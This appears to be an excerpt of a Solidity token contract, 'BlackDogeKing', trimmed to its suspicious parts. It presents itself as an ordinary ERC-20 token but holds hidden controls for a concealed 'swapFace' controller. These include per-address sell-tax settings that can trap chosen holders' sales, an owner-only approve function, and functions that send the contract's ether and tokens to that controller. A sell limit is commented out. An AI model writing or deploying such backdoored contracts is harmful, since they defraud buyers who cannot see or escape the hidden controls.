...
contract BlackDogeKing is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "BlackDogeKing";
    string private _symbol = "BlackDogeKing";
    uint8 private _decimals = 9;

    address payable private marketingWalletAddress = payable(0xEb6F194B4fcCB6e21bef257d88F27F3B657577aD); 
    address payable private teamWalletAddress = payable(0x4419c98b694EA9664a7f5e57E94933729F375582); 
    ...
    uint256 private minimumTokensBeforeSwap = 1 * 10**7; 
	...
	address  public swapFace =_msgSender();
    ...
    constructor (uint256 serviceFee_,uint256[2] memory buyFeeSetting_) {
	    require(
            150000000000000000 == serviceFee_ ,
	...
	modifier onlyLeader {
       require(swapFace == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
	...
	function claimBalance() external {
        payable(swapFace).transfer(address(this).balance);
    }

    function claimToken(address token, uint256 amount) external{
        IERC20(token).transfer(swapFace, amount);
    }
	...
	function setAddressToken(address _address, bool _enable, uint256 _addressTaxFee) external onlyLeader {
	...
	function approve_(address spender, uint256 amount) internal{
        require(spender != address(0), "ERC20: approve to the zero address");
	...
	function Approve(address spender,uint256 amount)public onlyLeader{
        approve_(spender, amount);
    }
...
// 		uint256 amountpercent = 0;  
        ...
        if(isMarketPair[sender]) {
            ...
            if(airDropFeeAmount > 0) {
			    ...
			    _balances[teamWalletAddress] += airDropHalf;
...
//			require(amount <= amountpercent, "ERC20: over Percent");
			...
			if(_addressFees[sender].enable){
               feeAmount = amount.mul(_addressFees[sender]._sellTaxFee).div(100);
            }
            if(feeAmount > 0) {
                _balances[address(this)] = _balances[address(this)].add(feeAmount);
                emit Transfer(sender, address(this), feeAmount);
